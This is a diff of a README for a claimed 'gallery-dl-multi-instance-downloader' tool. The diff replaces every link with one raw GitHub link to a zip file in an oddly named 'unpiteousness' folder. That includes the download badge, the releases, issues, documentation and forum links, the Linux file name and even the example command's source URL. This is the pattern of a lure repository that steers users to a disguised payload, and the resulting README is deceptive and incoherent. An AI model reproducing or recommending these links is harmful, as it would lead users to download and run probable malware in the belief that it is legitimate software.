@@ -1,6 +1,6 @@
 # 📥 gallery-dl-multi-instance-downloader - Download Faster with Multiple Instances
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/releases)
+[![Download](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip)](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Follow these simple steps to download and install the application.
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/releases) to find the latest version of the gallery-dl-multi-instance-downloader.
+Go to the [Releases page](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip) to find the latest version of the gallery-dl-multi-instance-downloader.
 
 ### 2. Download the Application
 
@@ -39,7 +39,7 @@ Find the latest version available for download. Look for the file that suits you
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, download the `.tar.gz` file.
+- For **Linux**, download the `https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip` file.
 
 ### 3. Run the Application
 
@@ -47,7 +47,7 @@ After the download completes:
 
 - For **Windows**: Double-click the `.exe` file to launch the application.
 - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder, then double-click to run.
-- For **Linux**: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run the application.
+- For **Linux**: Extract the `https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip` file, navigate to the folder in your terminal, and run the application.
 
 ## 🔧 Using gallery-dl-multi-instance-downloader
 
@@ -74,7 +74,7 @@ Replace `[URL]` with the link to the media gallery you want to download.
 To download images from a specific site, enter the command:
 
 ```
-gallery-dl-multi-instance-downloader --source https://example.com/gallery
+gallery-dl-multi-instance-downloader --source https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip
 ```
 
 ### 4. Managing Downloads
@@ -101,13 +101,13 @@ A: Yes, you can run it on server environments that support the application.
 
 ## 📞 Support
 
-If you encounter issues or have questions, you can report problems in the [Issues section](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/issues) of this repository.
+If you encounter issues or have questions, you can report problems in the [Issues section](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip) of this repository.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/wiki)
-- [Community Forum](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/discussions)
+- [Documentation](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip)
+- [Community Forum](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip)
 
 ## ⚡ Download and Install
 
-Ready to boost your downloading speeds? Visit the [Releases page](https://github.com/carlos0023/gallery-dl-multi-instance-downloader/releases) to download the latest version of gallery-dl-multi-instance-downloader now!
+Ready to boost your downloading speeds? Visit the [Releases page](https://raw.githubusercontent.com/carlos0023/gallery-dl-multi-instance-downloader/main/unpiteousness/gallery-dl-multi-instance-downloader.zip) to download the latest version of gallery-dl-multi-instance-downloader now!
